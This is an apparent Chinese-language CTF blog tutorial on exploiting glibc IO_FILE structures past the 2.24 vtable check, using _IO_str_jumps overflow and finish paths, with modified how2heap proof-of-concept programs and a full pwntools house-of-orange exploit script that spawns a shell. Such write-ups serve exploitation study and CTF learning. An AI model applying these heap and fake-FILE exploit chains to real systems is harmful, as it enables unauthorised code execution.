[TOC]

# glibc 2.24 下 IO_FILE 的利用

## 介绍：

1. 在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 **vtable 劫持的检测措施**，glibc 会在调用虚函数之前首先**检查 vtable 地址的合法性**。首先会**验证 vtable 是否位于_IO_vtable 段**中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。

   ![image-20240821142640099](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211426164.png)

   ```c
   /* Check if unknown vtable pointers are permitted; otherwise,
      terminate the process.  */
   void _IO_vtable_check (void) attribute_hidden;
   
   /* Perform vtable pointer validation.  If validation fails, terminate
      the process.  */
   static inline const struct _IO_jump_t *
   IO_validate_vtable (const struct _IO_jump_t *vtable)
   {
     /* Fast path: The vtable pointer is within the __libc_IO_vtables
        section.  */
     uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
     const char *ptr = (const char *) vtable;
     uintptr_t offset = ptr - __start___libc_IO_vtables;
     if (__glibc_unlikely (offset >= section_length)) // 超出范围
       /* The vtable pointer is not in the expected section.  Use the
          slow path, which will terminate the process if necessary.  */
       _IO_vtable_check ();
     return vtable;
   }
   
   
   void attribute_hidden
   _IO_vtable_check (void)
   {
   #ifdef SHARED
     /* Honor the compatibility flag.  */
     void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
   #ifdef PTR_DEMANGLE
     PTR_DEMANGLE (flag);
   #endif
     if (flag == &_IO_vtable_check)
       return;
   
     /* In case this libc copy is in a non-default namespace, we always
        need to accept foreign vtables because there is always a
        possibility that FILE * objects are passed across the linking
        boundary.  */
     {
       Dl_info di;
       struct link_map *l;
       if (!rtld_active ()
           || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
               && l->l_ns != LM_ID_BASE))
         return;
     }
   
   #else /* !SHARED */
     /* We cannot perform vtable validation in the static dlopen case
        because FILE * handles might be passed back and forth across the
        boundary.  Therefore, we disable checking in this case.  */
     if (__dlopen != NULL)
       return;
   #endif
   
     __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
   }
   ```

   如果 vtable 是非法的，那么会引发 abort。

   这里的检查使得以往使用 vtable 进行利用的技术很难实现。

## 新的利用技术



### fileno 与缓冲区的相关利用

1. 在 vtable 难以被利用之后，利用的关注点从 vtable 转移到_IO_FILE 结构内部的域中。 前面介绍过 _IO_FILE 在使用标准 IO 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如 fwrite、fread 等函数时**写入地址或读取地址**的，如果可以**控制这些数据**就可以实现任意地址写或任意地址读。

   ```c
   struct _IO_FILE {
     int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
     /* The following pointers correspond to the C++ streambuf protocol. */
     /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
     char* _IO_read_ptr;   /* Current read pointer */
     char* _IO_read_end;   /* End of get area. */
     char* _IO_read_base;  /* Start of putback+get area. */
     char* _IO_write_base; /* Start of put area. */
     char* _IO_write_ptr;  /* Current put pointer. */
     char* _IO_write_end;  /* End of put area. */
     char* _IO_buf_base;   /* Start of reserve area. */
     char* _IO_buf_end;    /* End of reserve area. */
     /* The following fields are used to support backing up and undo. */
     char *_IO_save_base; /* Pointer to start of non-current get area. */
     char *_IO_backup_base;  /* Pointer to first valid character of backup area */
     char *_IO_save_end; /* Pointer to end of non-current get area. */
   
     struct _IO_marker *_markers;
   
     struct _IO_FILE *_chain;
   
     int _fileno;
     int _flags2;
     _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
   };
   ```

   因为进程中包含了系统默认的三个文件流 stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过 scanf\printf 一样可以进行利用。

   在 _ IO_FILE 中**_ IO_buf_base 表示操作的起始地址**，**_IO_buf_end 表示结束地址**，通过控制这两个数据可以实现控制读写的操作。

### 实例：

1. 简单的观察一下_IO_FILE 对于调用 scanf 的作用：

   ```c
   #include <stdlib.h>
   #include <stdio.h>
   #include <string.h>
   int main(void)
   {
        char stack_buf[100];
        scanf("%s",stack_buf);
        scanf("%s",stack_buf);
        return 0;	
   }
   ```

   在执行程序第一次使用 stdin 之前，**stdin 的内容还未初始化**是空的：

   <img src="https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211443307.png" alt="image-20240821144311169" style="zoom: 50%;" />

   调用 scanf 之后可以看到**_IO_read_ptr、_IO_read_base、_IO_read_end、_IO_buf_base、_IO_buf_end** 等域都被初始化，但是**_IO_2_1_stdout_还未初始化**，因为没有调用有关输出的函数：

   <img src="https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211444522.png" alt="image-20240821144420361" style="zoom:50%;" />

   进一步观察，可以发现其实 **stdin 初始化的内存是在堆上分配**出来的，在这里**堆的基址是 0x405000**，因为之前没有堆分配因此**缓冲区的地址也是 0x405010** ：

   ![image-20240821144642284](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211446378.png)

   我这里使用的是glibc2.27，前面有一个tcache，所以起始地址是0x405260，大小为0x400：

   ![image-20240821144737899](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211447062.png)

   ![image-20240821145315162](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211453272.png)

   接下来我们尝试**修改_IO_buf_base** 来实现**任意地址读写**，全局缓冲区 buf 的地址是 0x7ffff7bec880。**修改_IO_buf_base 和_IO_buf_end** 到缓冲区 buf 的地址：

   ![image-20240821145742308](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211457385.png)

   <img src="https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211501714.png" alt="image-20240821150103576" style="zoom:50%;" />

   之后 **scanf 的读入数据**就会写入到 0x7ffff7bec880 的位置，同时也可以看到**_IO_read_ptr、_IO_read_base、_IO_read_end、_IO_buf_base、_IO_buf_end** 值也根据_IO_buf_base 的值而有所修改：

   ![image-20240821150204103](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211502298.png)

### 1. _IO_str_jumps -> overflow

1. `libc`中不仅仅只有`_IO_file_jumps`这么一个`vtable`，还有一个叫`_IO_str_jumps`的 ，这个 `vtable` 不在 check 范围之内。

<img src="https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211954116.png" alt="image-20240821195445832" style="zoom: 33%;" />

2. 如果我们能设置文件指针的 `vtable` 为 `_IO_str_jumps` 那么就能调用不一样的文件操作函数。这里以`_IO_str_overflow`为例子：

   ```c
   //glibc-2.27 以及之前的 _IO_str_overflow
   int _IO_str_overflow (_IO_FILE *fp, int c)
   {
     int flush_only = c == EOF;
     _IO_size_t pos;
     if (fp->_flags & _IO_NO_WRITES)
         return flush_only ? 0 : EOF;
     if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
       {
         fp->_flags |= _IO_CURRENTLY_PUTTING;
         fp->_IO_write_ptr = fp->_IO_read_ptr;
         fp->_IO_read_ptr = fp->_IO_read_end;
       }
     pos = fp->_IO_write_ptr - fp->_IO_write_base;
     if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
       {
         if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
   	return EOF;
         else
   	{
   	  char *new_buf;
   	  char *old_buf = fp->_IO_buf_base;
   	  size_t old_blen = _IO_blen (fp);
   	  _IO_size_t new_size = 2 * old_blen + 100;
   	  if (new_size < old_blen)
   	    return EOF;
   	  new_buf
   	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size); //劫持程序的流程
   	  if (new_buf == NULL)
   	    {
   	      /*	  __ferror(fp) = 1; */
   	      return EOF;
   	    }
   	  if (old_buf)
   	    {
   	      memcpy (new_buf, old_buf, old_blen);
   	      (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);
   	      /* Make sure _IO_setb won't try to delete _IO_buf_base. */
   	      fp->_IO_buf_base = NULL;
   	    }
   	  memset (new_buf + old_blen, '\0', new_size - old_blen);
   
   	  _IO_setb (fp, new_buf, new_buf + new_size, 1);
   	  fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
   	  fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
   	  fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
   	  fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);
   
   	  fp->_IO_write_base = new_buf;
   	  fp->_IO_write_end = fp->_IO_buf_end;
   	}
       }
   
     if (!flush_only)
       *fp->_IO_write_ptr++ = (unsigned char) c;
     if (fp->_IO_write_ptr > fp->_IO_read_end)
       fp->_IO_read_end = fp->_IO_write_ptr;
     return c;
   }
   
   //glibc2.28 的_IO_str_overflow函数
   
   int _IO_str_overflow (FILE *fp, int c)
   {
     int flush_only = c == EOF;
     size_t pos;
     if (fp->_flags & _IO_NO_WRITES)
         return flush_only ? 0 : EOF;
     if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
       {
         fp->_flags |= _IO_CURRENTLY_PUTTING;
         fp->_IO_write_ptr = fp->_IO_read_ptr;
         fp->_IO_read_ptr = fp->_IO_read_end;
       }
     pos = fp->_IO_write_ptr - fp->_IO_write_base;
     if (pos >= (size_t) (_IO_blen (fp) + flush_only))
       {
         if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
   	return EOF;
         else
   	{
   	  char *new_buf;
   	  char *old_buf = fp->_IO_buf_base;
   	  size_t old_blen = _IO_blen (fp);
   	  size_t new_size = 2 * old_blen + 100;
   	  if (new_size < old_blen)
   	    return EOF;
   	  new_buf = malloc (new_size); // 这里直接调用了malloc函数
   	  if (new_buf == NULL)
   	    {
   	      /*	  __ferror(fp) = 1; */
   	      return EOF;
   	    }
   	  if (old_buf)
   	    {
   	      memcpy (new_buf, old_buf, old_blen);
   	      free (old_buf);
   	      /* Make sure _IO_setb won't try to delete _IO_buf_base. */
   	      fp->_IO_buf_base = NULL;
   	    }
   	  memset (new_buf + old_blen, '\0', new_size - old_blen);
   
   	  _IO_setb (fp, new_buf, new_buf + new_size, 1);
   	  fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
   	  fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
   	  fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
   	  fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);
   
   	  fp->_IO_write_base = new_buf;
   	  fp->_IO_write_end = fp->_IO_buf_end;
   	}
       }
   
     if (!flush_only)
       *fp->_IO_write_ptr++ = (unsigned char) c;
     if (fp->_IO_write_ptr > fp->_IO_read_end)
       fp->_IO_read_end = fp->_IO_write_ptr;
     return c;
   }
   ```
   
   利用以下代码来劫持程序流程：
   
   ```c
   	  new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
   ```
   
   需要满足一下条件，来**绕过判断** ，是程序来到该位置：
   
   * fp->_flags & _IO_NO_WRITES **为假** 
   * (pos = **fp->_IO_write_ptr - fp->_IO_write_base**) >= (**(fp->_ IO_buf_end - fp->_IO_buf_base)** + flush_only(1)) 为真
   * fp->_flags & _IO_USER_BUF **为假** 
   * (fp->_ IO_buf_end - fp->_IO_buf_base) + 100 **不能为负数** 
   
   下面的条件来**getshell** ：
   
   * new_size = 2 * (fp->_ IO_buf_end - fp->_IO_buf_base) + 100; 应当等于 **/bin/sh字符串** 对应的地址
   * fp+0xf0指向system地址
   
   看一下_IO_strfile这个结构体，其中又涉及到 _IO_str_fields和 _IO_streambuf两个结构体，就能明白为什么**system的地址要填在fp+0xe0**：
   
   ![image-20240821153756495](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211537576.png)
   
   将**_IO_2_1_stdin_强制转化为_IO_strfile_类型**后输出，观察**_allocate_buffer偏移**情况（因为最后函数是通过 _allocate_buffer来调用的）：
   
   <img src="https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211549874.png" alt="image-20240821154952691" style="zoom:50%;" />
   
   
   
   最后构造：
   
   ```c
   _flags = 0
   _IO_write_base = 0
   _IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1
   _IO_buf_end = (binsh_in_libc_addr -100) / 2 
   
   //_freeres_list = 0x2
   //_freeres_buf = 0x3
   _mode = -1
   
   vtable = _IO_str_overflow - 0x18 = _IO_str_jumps
   fp+0xf0 -> system_addr
   ```

#### 实例：

1. 修改了 how2heap 的 houseoforange 代码，来自己动手调试一下。

   ```c
   #include <stdio.h>
   #include <stdlib.h>
   #include <string.h>
   int winner ( char *ptr);
   int main()
   {
       char *p1, *p2;
       size_t io_list_all, *top;
       // unsorted bin attack
       p1 = malloc(0x400-16);
       top = (size_t *) ( (char *) p1 + 0x400 - 16);
       top[1] = 0xc01;
       p2 = malloc(0x1000);
       io_list_all = top[2] + 0x9a8;
       top[3] = io_list_all - 0x10;
       // _IO_str_overflow conditions
       char binsh_in_libc[] = "/bin/sh"; // we can found "/bin/sh" in libc, here i create it in stack
       // top[0] = ~1;
       // top[0] &= ~8;
       top[0] = 0;
       top[4] = 0; // write_base
       top[5] = ((size_t)&binsh_in_libc-100)/2 + 1; // write_ptr
       top[7] = 0; // buf_base
       top[8] = top[5] - 1; // buf_end
       // house_of_orange conditions
       top[1] = 0x61;
   
       //top[20] = (size_t) &top[18];
       top[21] = 2;
       top[22] = 3;
       top[24] = -1;
       top[27] = (size_t)stdin - 0x1140; // _IO_str_jumps地址
       top[28] = (size_t) &winner;
   
       /* Finally, trigger the whole chain by calling malloc */
       malloc(10);
       return 0;
   }
   int winner(char *ptr)
   { 
       system(ptr);
       return 0;
   }
   ```

   伪造的file如下：
   
   <img src="https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211639451.png" alt="image-20240821163936329" style="zoom:50%;" />
   
   查看相应的结构体如下：
   
   <img src="https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211701372.png" alt="image-20240821170117124" style="zoom:50%;" />
   
   最后申请malloc，**mian_arena_88+0x68处的_chain**成功衔接到fake_file:
   
   ![image-20240821164638732](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211646929.png)
   
   最后，进入到**_IO_flush_all_lockp**函数来刷新所有文件，后面成功调用到  **_ IO_str_overflow函数**（如果没有用_IO_str_jumps地址来覆盖vtable的话，该位置应该调用的是 _IO_file_overflow函数），传入的参数是fake_chunk的地址：
   
   ![image-20240821175402369](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211754599.png)
   
   进入到_IO_str_overflow函数后，成功绕过检查，调用到winner，传入的参数是**/bin/sh字符串的地址**：
   
   ![image-20240821170338895](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211703028.png)
   
   ![image-20240821175626428](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211756594.png)
   
   最后成功get shell：
   
   ![image-20240821173941797](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408211739880.png)
   
2. 总结：

   * 区别于直接覆盖vtable到伪造的地址，用**IO_str_jumps的地址**来覆盖能够通过_IO_vtable_check检查：
   
   * 伪造的FILE满足的条件除了：(**fp-> _ mode** <= 0 && **fp->_ IO_write_ptr** > **fp->_ IO_write_base**)（使得能调用到IO_str_overflow函数）
   
     其次还要满足：
   
     * fp->_flags & _IO_NO_WRITES **为假** 
     * (pos = **fp->_IO_write_ptr - fp->_IO_write_base**) >= (**(fp->_ IO_buf_end - fp->_IO_buf_base)** + flush_only(1)) 为真
     * fp->_flags & _IO_USER_BUF **为假** 
     * (fp->_ IO_buf_end - fp->_IO_buf_base) + 100 **不能为负数** 
   
     最后才能控制程序的执行流程，下面的条件来**getshell** ：
   
     * new_size = 2 * (fp->_ IO_buf_end - fp->_IO_buf_base) + 100; 应当等于 **/bin/sh字符串** 对应的地址
     * fp+0xf0指向system地址

### 2. _IO_str_jumps -> finish

1. 原理与上面的 _IO_str_jumps -> overflow 类似：

   ```c
   //glibc-2.27以及之前 的_IO_str_finish函数
   void _IO_str_finish(_IO_FILE *fp, int dummy)
   {
     if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
       (((_IO_strfile *)fp)->_s._free_buffer)(fp->_IO_buf_base); // 挟持程序的执行流程
     fp->_IO_buf_base = NULL;
   
     _IO_default_finish(fp, 0);
   }
   
   //glibc-2.28
   void
   _IO_str_finish (FILE *fp, int dummy)
   {
     if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
       free (fp->_IO_buf_base); // 这里直接调用free函数
     fp->_IO_buf_base = NULL;
   
     _IO_default_finish (fp, 0);
   }
   ```
   
   需要的条件：
   
   * fp->_IO_buf_base 不能为空
   * fp->_flags & _IO_USER_BUF 要为假
   
   构造如下：
   
   ```c
   _flags = (binsh_in_libc + 0x10) & ~1
   _IO_buf_base = bin_sh_addr
   	
   _freeres_list = 0x2
   _freeres_buf = 0x3
   _mode = -1
   vtable = _IO_str_finish - 0x18 = _IO_str_jumps - 0x8
   fp+0xe8 -> system_addr
   ```



#### 实例:

1. 1：修改了 how2heap 的 houseoforange 代码，可以自己动手调试一下：

   ```c
   #include <stdio.h>
   #include <stdlib.h>
   #include <string.h>
   int winner ( char *ptr);
   int main()
   {
       char *p1, *p2;
       size_t io_list_all, *top;
       // unsorted bin attack
       p1 = malloc(0x400-16);
       top = (size_t *) ( (char *) p1 + 0x400 - 16);
       top[1] = 0xc01;
       p2 = malloc(0x1000);
       io_list_all = top[2] + 0x9a8;
       top[3] = io_list_all - 0x10;
       
       // _IO_str_overflow conditions
       char binsh_in_libc[] = "/bin/sh"; // we can found "/bin/sh" in libc, here i create it in stack
       // top[0] = ~1;
       // top[0] &= ~8;
       top[0] = 0;
       top[4] = 0; // write_base
       top[5] = 1; // write_ptr
       top[7] = (size_t)&binsh_in_libc; // buf_base
       top[8] = 0; // buf_end
       
       // house_of_orange conditions
       top[1] = 0x61;
       //top[20] = (size_t) &top[18];
       top[21] = 2;
       top[22] = 3;
       top[24] = -1;
       top[27] = (size_t)stdin - 0x1160 -8; // _IO_str_jumps地址
       top[29] = (size_t) &winner;
   
       /* Finally, trigger the whole chain by calling malloc */
       malloc(10);
       return 0;
   }
   int winner(char *ptr)
   { 
       system(ptr);
       return 0;
   }
   ```

2. 调试如下：

   伪造的fake_chunk:

   <img src="https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408212018323.png" alt="image-20240821201805048" style="zoom:50%;" />

   成功调用到**_IO_str_finish函数**：

   ![image-20240821201837406](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408212018587.png)

   成功绕过检查，调用到winner函数：

   ![image-20240821202149017](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408212021363.png)

   成功get shell：

   ![image-20240821202224930](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408212022023.png)



## 最后拓展一下上一篇博客house of orange题目的做法:

文章：[House of Orange-CSDN博客](https://blog.csdn.net/yjh_fnu_ltn/article/details/141143144?spm=1001.2014.3001.5501)

1. EXP，分别使用上面两钟方法：

   ```py
   from pwn import *
   import numpy as np
   # from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   
   def debug():
       gdb.attach(p)
   
   # p = remote("node4.anna.nssctf.cn",28353)
   # libc = ELF('./libc.so.6')
   p = process("./pwn") 
   libc = ELF("/home/kali/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
   # elf = ELF("./pwn")
   
   
   def add(size,name):
       p.sendlineafter(b':',b'1')
       p.sendlineafter(b'it',str(size).encode())
       p.sendafter(b"?",name)
   
   def edit(content):
       p.sendlineafter(b':',b'2')
       p.sendlineafter(b"it",str(len(content)).encode())
       p.sendafter(b"name",content)
   
   def show():
       p.sendlineafter(b':',b'3')
   
   # 回收heap地址
   heap_addr = eval(p.recv(14).decode())-0x10
   success("heap_addr ==> " + hex(heap_addr))
   
   # 泄漏libc地址
   add(0x10,b"lzl")
   payload = p64(0)*3 + p64(0xfc1)
   edit(payload)
   add(0x1000,b"lzl")
   
   add(0x10,b"a"*8)
   show()
   p.recv()
   addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   success("main_arena_unsortbin_addr==>"+hex(addr))
   main_arena_offset = libc.symbols["__malloc_hook"]+0x10
   success("main_arena_offset==>"+hex(main_arena_offset))
   libc_base = (addr-(main_arena_offset+0x58)-0x610)
   success("libc_addr==>"+hex(libc_base))
   
   IO_list_all_addr   = libc_base + libc.symbols["_IO_list_all"]
   _IO_str_jumps_addr = IO_list_all_addr - 0x1D80
   system_addr        = libc_base + libc.sym["system"]
   sh_addr            = libc_base + next(libc.search(b"/bin/sh"))
   
   success("_IO_str_jumps_addr ==> " + hex(_IO_str_jumps_addr))
   success("IO_list_all_addr   ==> " + hex(IO_list_all_addr))
   success("system_addr        ==> " + hex(system_addr))
   success("sh_addr            ==> " + hex(sh_addr))
   
   # ============= 法一 =============
   # # unsorted bin attack 覆盖IO_list_all指针
   # # 构造IO_file 覆盖vtable -> 堆上地址，最后调用_IO_new_file_overflow函数get shell
   # payload = p64(0)*2
   # # file头
   # payload+= b"/bin/sh\x00" + p64(0x60)
   # # unsorted bin attack
   # payload+= p64(0) + p64(IO_list_all_addr-0x10)
   # # _IO_write_ptr > _IO_write_base
   # payload+= p64(0) + p64(1)
   # payload = payload.ljust(0xe8,b"\x00")
   # payload+= p64(heap_addr + 0x140) + p64(0)*3 + p64(system_addr)
   
   
   # # ============= 法二 =============
   # # unsorted bin attack 覆盖IO_list_all指针
   # # 构造IO_file 覆盖vtable -> _IO_str_jumps ，最后调用__GI__IO_str_overflow函数get shell
   # payload = p64(0)*2
   # # file头 flag   _IO_read_ptr
   # payload+= p64(0) + p64(0x60)
   # # unsorted bin attack
   # payload+= p64(0) + p64(IO_list_all_addr-0x10)
   
   # #  _IO_write_base < _IO_write_ptr && 
   # payload+= p64(0) + p64(int((sh_addr-100)/2 + 4))
   # # _IO_buf_end
   # payload+= p64(0)*2 + p64(int((sh_addr-100)/2 + 3))
   
   # payload = payload.ljust(0xe8,b"\x00")
   # # vtable->_IO_str_jumps   _allocate_buffer->system_addr
   # payload+= p64(_IO_str_jumps_addr) + p64(system_addr)
   
   
   # ============= 法三 =============
   # unsorted bin attack 覆盖IO_list_all指针
   # 构造IO_file 覆盖vtable -> _IO_str_jumps ，最后调用_IO_str_finish函数get shell
   payload = p64(0)*2
   # file头 flag   _IO_read_ptr
   payload+= p64(0) + p64(0x60)
   # unsorted bin attack
   payload+= p64(0) + p64(IO_list_all_addr-0x10)
   
   #  _IO_write_base < _IO_write_ptr && _IO_write_end
   payload+= p64(0) + p64(1) + p64(0)
   # _IO_buf_end
   payload+= p64(sh_addr)
   payload = payload.ljust(0xe8,b"\x00")
   # vtable->_IO_str_jumps   _allocate_buffer->system_addr
   payload+= p64(_IO_str_jumps_addr - 0x8) + p64(0) + p64(system_addr)
   edit(payload)
   
   p.sendlineafter(b':',b'1')
   p.sendlineafter(b'it',str(0x10).encode())
   p.sendline(b"cat flag")
   p.interactive()
   ```
   
   关键部分，伪造的fake_chunk:
   
   法二，这里要注意，由于 字符串"/bin/sh"的地址是一个奇数，所以使用**完整的"/bin/sh"不可行**，会导致参数传递不完整，**只能使用字符串"sh"的地址**：
   
   <img src="https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408212159820.png" alt="image-20240821215916641" style="zoom:50%;" />
   
   <img src="https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408212202453.png" alt="image-20240821220227269" style="zoom: 33%;" />
   
   
   
   <img src="https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408212152010.png" alt="image-20240821215215843" style="zoom:33%;" />
   
   
   
   法三：
   
   ![image-20240821215354675](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408212153829.png)
   
   都是能打通的：
   
   ![image-20240821214612285](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408212146427.png)
   
   ![image-20240821214727566](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408212147693.png)
   
2. 另外，添加部分**vtable判断的调试源码 **：

   计算vtable段的长度，查看_IO_str_jumps相对头部的偏移==>0xc00：

   ![image-20240822163117022](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408221631321.png)

   IO_validate_vtable检查_IO_str_jumps是否在段内：

   ![image-20240822163458969](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408221634166.png)

